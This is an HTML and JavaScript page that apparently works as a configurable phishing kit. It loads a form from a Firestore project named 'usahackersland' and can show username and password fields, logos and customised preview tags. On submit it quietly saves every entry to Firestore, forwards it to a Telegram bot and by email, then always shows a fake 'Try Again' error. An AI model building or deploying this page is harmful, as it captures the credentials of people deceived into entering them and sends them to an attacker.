<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading...</title>

<meta name="description" id="metaDesc" content="Loading...">

<!-- Open Graph -->
<meta property="og:title" id="ogTitle" content="Loading...">
<meta property="og:description" id="ogDesc" content="Loading...">
<meta property="og:image" id="ogImage" content="">
<meta property="og:url" content="">
<meta property="og:type" content="website">

<style>
body{
  font-family: Arial, sans-serif;
  background:#f4f6f8;
  padding:20px;
  transition: background 0.3s;
}

#formContainer{
  max-width:600px;
  margin:auto;
  background:#fff;
  padding:20px;
  border-radius:10px;
  box-shadow:0 0 10px rgba(0,0,0,0.1);
  transition: background 0.3s;
}

.builder-media{text-align:center;margin-bottom:12px;}
.builder-media img, .builder-media video{max-width:100%;margin-bottom:8px;border-radius:6px;}

h2{text-align:center;margin:10px 0;}
#formDesc{text-align:center;margin-bottom:12px;}
#formID{text-align:center;font-size:12px;color:#555;margin-bottom:10px;}

#failureWarning{color:#b71c1c;font-weight:bold;text-align:center;margin-bottom:4px;}
#submitResult{color:#b71c1c;font-weight:bold;text-align:center;margin-bottom:10px;opacity:0;transition:opacity 0.5s;}

input, textarea, button{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #ccc;box-sizing:border-box;}
button{cursor:pointer;background:#1976d2;color:#fff;border:none;}

.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px;word-break:break-all;}
</style>

<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
</head>
<body>
<div id="formContainer">

  <div id="formID"></div>

  <div id="imageContainer" class="builder-media"></div>

  <h2 id="formTitle">Loading...</h2>
  <div id="formDesc"></div>

  <div id="failureWarning"></div>
  <div id="submitResult">⚠️ Try Again</div>

  <form id="dynamicForm"></form>

  <div id="embedLinks"></div>

</div>

<script>
const $ = id=>document.getElementById(id);

/* FIREBASE INIT */
firebase.initializeApp({
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
});
const db = firebase.firestore();

/* EMAILJS INIT */
emailjs.init("YOUR_EMAILJS_USER_ID"); // replace with your EmailJS user ID

/* TELEGRAM CONFIG */
const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; // replace with your bot token
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // replace with your chat id

/* PARAMS */
const formId = new URLSearchParams(location.search).get("id");
const formEl = $("dynamicForm");
const imageContainer = $("imageContainer");
const embedEl = $("embedLinks");
const submitResult = $("submitResult");
const failureWarning = $("failureWarning");
const formIDEl = $("formID");

let formConfig = null;

if(!formId){
  $("formTitle").innerText = "Form ID missing!";
}

/* APPLY SEO + OG TAGS */
function applySEOMeta(config){
  if(!config) return;
  document.title = config.seoTitle || config.title || "Form";
  document.querySelector('meta[name="description"]').setAttribute("content", config.metaDesc || config.description || "");
  document.querySelector('meta[property="og:title"]').setAttribute("content", config.seoTitle || config.title || "");
  document.querySelector('meta[property="og:description"]').setAttribute("content", config.metaDesc || config.description || "");
  if(config.ogImage) document.querySelector('meta[property="og:image"]').setAttribute("content", config.ogImage);
  document.querySelector('meta[property="og:url"]').setAttribute("content", window.location.href);
}

/* LOAD FORM */
db.collection("forms").doc(formId).get().then(doc=>{
  if(!doc.exists){
    $("formTitle").innerText = "Form not found!";
    return;
  }
  formConfig = doc.data();
  applySEOMeta(formConfig);
  renderForm();
});

/* RENDER FORM */
function renderForm(){
  formIDEl.innerText = "Form ID: " + formId;
  $("formTitle").innerText = formConfig.title || "";
  $("formTitle").style.color = formConfig.titleColor || "#000";
  $("formDesc").innerText = formConfig.description || "";
  $("formDesc").style.color = formConfig.textColor || "#444";

  if(formConfig.bgColor) document.body.style.background = formConfig.bgColor;
  if(formConfig.bgImage) document.body.style.backgroundImage = `url('${formConfig.bgImage}')`;

  imageContainer.innerHTML = "";
  formEl.innerHTML = "";
  embedEl.innerHTML = "";
  failureWarning.innerText = "";

  if(formConfig.avatarURL) imageContainer.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%">`;
  if(formConfig.logoURL) imageContainer.innerHTML += `<img src="${formConfig.logoURL}">`;
  if(Array.isArray(formConfig.videos)) formConfig.videos.forEach(v=>{
    imageContainer.innerHTML += `<video controls src="${v}" style="max-width:100%;margin-bottom:8px;"></video>`;
  });

  if(formConfig.enableWarning && formConfig.warning) failureWarning.innerText = formConfig.warning;

  if(formConfig.addAuth && formConfig.usernamePlaceholder && formConfig.passwordPlaceholder){
    formEl.innerHTML += `
      <input name="username" placeholder="${formConfig.usernamePlaceholder}" required>
      <input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required>
    `;
  }

  if(Array.isArray(formConfig.extraFields)){
    formConfig.extraFields.filter(f=>f && f.trim()!=="").forEach(f=>{
      formEl.innerHTML += `<input name="${f}" placeholder="${f}" required>`;
    });
  }

  if(formConfig.showMainBtn && formConfig.buttonText){
    const btn = document.createElement("button");
    btn.textContent = formConfig.buttonText;
    btn.style.background = formConfig.btnColor || "#1976d2";
    formEl.appendChild(btn);
  }

  if(Array.isArray(formConfig.embedLinks)){
    formConfig.embedLinks.forEach(l=>{
      if(!l || !l.show || !l.url) return;
      embedEl.innerHTML += `
        <div class="embedLink">
          <strong>${l.text||""}</strong><br>
          <a href="${l.url}" target="_blank">${l.url}</a>
          ${l.desc? `<br><small>${l.desc}</small>` : ""}
        </div>
      `;
    });
  }

  formEl.querySelectorAll("button").forEach(btn=> btn.onclick = submitForm);
}

/* SUBMIT */
function submitForm(e){
  e.preventDefault();
  const data = {};
  formEl.querySelectorAll("input,textarea").forEach(i=>{
    if(i.value.trim()!=="") data[i.name]=i.value;
  });

  // Save to Firebase
  db.collection("submissions").add({ formId, data, createdAt: new Date().toISOString() });

  // Telegram Alert
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: `New Form Submission (ID: ${formId}):\n` + JSON.stringify(data, null, 2)
    })
  });

  // Email Alert via EmailJS
  emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID",{formId,data})
  .then(()=>console.log("Email sent"))
  .catch(err=>console.error("Email error",err));

  submitResult.style.opacity=1;
  setTimeout(()=>submitResult.style.opacity=0,3000);
  formEl.reset();
}
</script>
</body>
</html>
